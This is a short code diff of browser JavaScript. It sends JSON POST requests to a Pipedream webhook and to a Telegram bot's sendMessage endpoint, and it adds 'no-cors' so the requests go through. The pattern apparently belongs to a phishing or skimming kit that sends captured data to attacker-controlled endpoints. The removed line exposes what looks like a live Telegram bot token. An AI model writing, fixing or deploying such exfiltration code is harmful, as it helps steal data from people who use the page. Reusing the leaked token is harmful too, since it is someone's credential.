@@ -234,6 +234,7 @@ localStorage.setItem(
 );
       fetch("https://eon8e8gh7h0nvjz.m.pipedream.net", {
   method: "POST",
+  mode: "no-cors",
   headers: {
     "Content-Type": "application/json"
   },
@@ -256,8 +257,9 @@ localStorage.setItem(
   })
 });
 
-fetch("https://api.telegram.org/bot8539363038:AAGm30GEC8_k9YYlFfEFx5mI3iKeiMPAYSU/sendMessage", {
+fetch("https://api.telegram.org/bot...", {
   method: "POST",
+  mode: "no-cors",
   headers: {
     "Content-Type": "application/json"
   },
